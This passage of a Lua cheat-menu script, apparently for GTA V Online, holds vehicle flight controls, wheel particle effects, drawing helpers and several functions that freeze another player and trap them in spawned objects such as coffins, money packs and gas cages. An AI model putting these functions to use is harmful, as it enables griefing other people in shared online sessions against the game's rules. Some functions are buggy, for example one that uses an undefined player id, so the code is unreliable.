    veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, TRUE);
    ENTITY.SET_ENTITY_COLLISION(veh, not no_collision, TRUE);
    
    local locspeed = speed*10
    local locspeed2 = speed
    if PAD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PAD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PAD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end
local careffects = {
	{"scr_rcbarry1", "scr_alien_impact_bul", 1.0, 50},
	{"scr_rcbarry2", "scr_clown_appears", 0.3, 500},
	{"core", "ent_dst_elec_fire_sp", 1.0, 100},
	{"scr_rcbarry1", "scr_alien_disintegrate", 0.1, 400},
	{"scr_rcbarry1", "scr_alien_teleport", 0.1, 400}
}
local careffects_lastEffect = newTimer()

function cargoodeffect()
    local effects = careffects[selectedOpt]
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

	if ENTITY.DOES_ENTITY_EXIST(vehicle) and not ENTITY.IS_ENTITY_DEAD(vehicle, false) and
	VEHICLE.IS_VEHICLE_DRIVEABLE(vehicle, false) and careffects_lastEffect.elapsed() > effects[4] then
		request_fx_asset(effects[1])
		for _, boneName in pairs({"wheel_lf", "wheel_lr", "wheel_rf", "wheel_rr"}) do
			local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
			GRAPHICS.USE_PARTICLE_FX_ASSET(effects[1])
			WIRI_GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
				effects[2],
				vehicle,
				-0.05, 0.0, 0.0,
				0.0, 0.0, 0.0,
				bone,
				effects[3],
				false, false, false
			)
		end
		careffects_lastEffect.reset()
	end
end

function set_carvis(index)
    selectedOpt = index
end
------------------------------------
-------------玩家笼子---------------
------------------------------------
spawned_objects = {}
--笼子
function ptlz(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
    if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
        util.yield(300)
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            notification("Failed to kick player out of the vehicle", colors.red)
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            return
        end
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
        pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    end
    cage_player(pos)
end
--七度空间
function qdkj(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--小车车
function cclz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local hash = 4022605402
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
    cages[#cages + 1] = cage_object
    util.yield(15)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function sdkl1(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--竞技管
function jjglz()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    STREAMING.REQUEST_MODEL(2081936690)
    while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
    cages[#cages + 1] = cage_object
    util.yield(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end

--伊丽莎白女王的棺材盒
function gueencage(pid)
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z += 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       spawned_objects[#spawned_objects + 1] = coffin
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end
--载具笼子
function vehcagelol(pid)
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--燃气笼
function gascage(pid)
    local gas_cage_hash = util.joaat("prop_gascage01")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(gas_cage_hash)
    pos.z -= 1
    local gas_cage = entities.create_object(gas_cage_hash, pos, 0)
    pos.z += 1
    local gas_cage2 = entities.create_object(gas_cage_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = gas_cage
    spawned_objects[#spawned_objects + 1] = gas_cage2
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage2, true)
end
--伤害数字
b_drawing_funcs = {}
b_drawing_funcs.new = function ()
    local self = {}
    self.draw_arrow = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
    
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
    
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
    end
    self.draw_arrow_down = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
    
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
        
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
    end
    self.draw_quad = function (pos1_org, pos2_org, size, colour_a, colour_b, dict, texture)
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict, false)
        if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict) then
            pos1 =  {x = pos1_org.x, y = pos1_org.y, z = pos1_org.z}
            pos2 =  {x = pos2_org.x, y = pos2_org.y, z = pos2_org.z}
            pos2.z = pos2.z - size * 0.5
            pos1.z = pos1.z - size * 0.5
            GRAPHICS.SET_BACKFACECULLING(false)
            GRAPHICS._DRAW_SPRITE_POLY_2(
                pos1.x,     pos1.y,             pos1.z,
                pos2.x,     pos2.y,             pos2.z,
                pos2.x,     pos2.y,             pos2.z + size,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                dict,
                texture,
                0, 1, 0, 
                1, 1, 0,
                0, 0, 0
            )
              GRAPHICS._DRAW_SPRITE_POLY_2(
                pos1.x,     pos1.y,             pos1.z + size,
                pos1.x,     pos1.y,             pos1.z,
                pos2.x,     pos2.y,             pos2.z + size,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                dict,
                texture,
                0, 0, 0,
                1, 1, 0,
                1, 0, 0
            )
        else
            notification("not loaded")
        end 
    end
    self.arc_line = {}
    self.arc_line.new = function ()
        arc = {}
        arc.instability = 0.75
        arc.draw = function (pos1, pos2)
            local dif = {x = pos2.x - pos1.x, y = pos2.y - pos1.y, z = pos2.z - pos1.z}
            local distance_to_cover = math.sqrt(
                (dif.x * dif.x) +
                (dif.y * dif.y) +
                (dif.z * dif.z)
            )
            local nor_dir = {x = dif.x / distance_to_cover, y = dif.y / distance_to_cover,z = dif.z / distance_to_cover}

            for _ = 0, 3, 1 do
                local distance_covered = math.random() * 1.5
                local previous_pos = pos1
                repeat
                    local current_pos = {
                        x = pos1.x + nor_dir.x * distance_covered + (math.random() - 0.5) * arc.instability,
                        y = pos1.y + nor_dir.y * distance_covered + (math.random() - 0.5) * arc.instability,
                        z = pos1.z + nor_dir.z * distance_covered + (math.random() - 0.5) * arc.instability
                    }
                    GRAPHICS.DRAW_LINE(
                        previous_pos.x, previous_pos.y, previous_pos.z,
                        current_pos.x , current_pos.y , current_pos.z,
                        0, 255, 255, 255
                    )
                    previous_pos = current_pos
                    distance_covered = distance_covered + math.random() * 1.5
                until distance_covered > distance_to_cover
                GRAPHICS.DRAW_LINE(
                    previous_pos.x, previous_pos.y, previous_pos.z,
                    pos2.x , pos2.y , pos2.z,
                    0, 255, 255, 255
                )
            end

            arc.instability = arc.instability + (0.15 - arc.instability) *  MISC.GET_FRAME_TIME() * 7
        end
        return arc
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    local upVector_pointer = memory.alloc()
    local rightVector_pointer = memory.alloc()
    local forwardVector_pointer = memory.alloc()
    local position_pointer = memory.alloc()
    self.draw_bounding_box = function (entity, colour)
        ENTITY.GET_ENTITY_MATRIX(entity, rightVector_pointer, forwardVector_pointer, upVector_pointer, position_pointer);
        local forward_vector = memory.read_vector3(forwardVector_pointer)
        local right_vector = memory.read_vector3(rightVector_pointer)
        local up_vector = memory.read_vector3(upVector_pointer)

        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local minimum_vec = memory.read_vector3(minimum)
        local maximum_vec = memory.read_vector3(maximum)
        local dimensions = {x = maximum_vec.y - minimum_vec.y, y = maximum_vec.x - minimum_vec.x, z = maximum_vec.z - minimum_vec.z}

        local top_right =           ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity,       maximum_vec.x, maximum_vec.y, maximum_vec.z)
        local top_right_back =      {x = forward_vector.x * -dimensions.y + top_right.x,        y = forward_vector.y * -dimensions.y + top_right.y,         z = forward_vector.z * -dimensions.y + top_right.z}
        local bottom_right_back =   {x = up_vector.x * -dimensions.z + top_right_back.x,        y = up_vector.y * -dimensions.z + top_right_back.y,         z = up_vector.z * -dimensions.z + top_right_back.z}
        local bottom_left_back =    {x = -right_vector.x * dimensions.x + bottom_right_back.x,  y = -right_vector.y * dimensions.x + bottom_right_back.y,   z = -right_vector.z * dimensions.x + bottom_right_back.z}
        local top_left =            {x = -right_vector.x * dimensions.x + top_right.x,          y = -right_vector.y * dimensions.x + top_right.y,           z = -right_vector.z * dimensions.x + top_right.z}
        local bottom_right =        {x = -up_vector.x * dimensions.z + top_right.x,             y = -up_vector.y * dimensions.z + top_right.y,              z = -up_vector.z * dimensions.z + top_right.z}
        local bottom_left =         {x = forward_vector.x * dimensions.y + bottom_left_back.x,  y = forward_vector.y * dimensions.y + bottom_left_back.y,   z = forward_vector.z * dimensions.y + bottom_left_back.z}
        local top_left_back =       {x = up_vector.x * dimensions.z + bottom_left_back.x,       y = up_vector.y * dimensions.z + bottom_left_back.y,        z = up_vector.z * dimensions.z + bottom_left_back.z}

        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            bottom_left.x, bottom_left.y, bottom_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            top_left_back.x, top_left_back.y, top_left_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_left_back.x, top_left_back.y, top_left_back.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_left_back.x, top_left_back.y, top_left_back.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left.x, bottom_left.y, bottom_left.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left.x, bottom_left.y, bottom_left.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
    end
    local numbers = {}
    local x_coord_ptr = memory.alloc(4)
    local y_coord_ptr = memory.alloc(4)
    local draw_numbers = function ()
        util.create_tick_handler(function() 
            local delta_time = MISC.GET_FRAME_TIME()
            for i, number in ipairs(numbers) do
                if GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(number.pos.x, number.pos.y, number.pos.z, x_coord_ptr, y_coord_ptr) then
                    local x = memory.read_float(x_coord_ptr)
                    local y = memory.read_float(y_coord_ptr)
                    local alpha = math.min(1, number.time)
                    directx.draw_text(x, y, number.num, ALIGN_CENTRE, number.size, {r = number.colour.r * alpha,g = number.colour.g * alpha,b = number.colour.b * alpha,a = number.colour.a * alpha}, false)
                    number.pos.z = number.pos.z + 0.2 * delta_time
                end
                number.time = number.time - delta_time
                if number.time < 0 then
                    table.remove(numbers, i)
                end
            end
            return #numbers ~= 0
        end)
    end
    local random_offset = 1
    self.draw_damage_number = function(entity, num, colour, size)
        pos = ENTITY.GET_ENTITY_COORDS(entity)
